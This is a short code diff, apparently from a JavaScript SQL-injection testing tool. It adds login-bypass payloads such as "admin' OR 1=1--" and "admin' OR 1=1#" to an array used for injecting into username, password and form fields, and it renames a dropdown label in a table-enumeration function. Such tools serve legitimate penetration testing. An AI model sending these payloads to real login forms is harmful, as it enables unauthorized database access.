@@ -36,7 +36,7 @@ var columnArray = [];
 
 var intOrderBy;
 // payload array for username, password & form injection
-var payloads = ["'", "admin' OR 1=1--", "admin'", "admin'--"];
+var payloads = ["'", "admin' OR 1=1--", "admin'", "admin'--", "--", "#", "admin' OR 1=1#"];
 
 // error array for username, password & form injection (when webpage returns SQL error with payload)
 var errors = ["Syntax error:", "SQL syntax", "Lexical error"];
@@ -307,7 +307,7 @@ function enumerateTable(){
     
             // Create options for the dropdown list
             const defaultOption = document.createElement("option");
-            defaultOption.textContent = "Select a value";
+            defaultOption.textContent = "Select a table";
             defaultOption.disabled = true;
             defaultOption.selected = true;
             dropdown.appendChild(defaultOption);
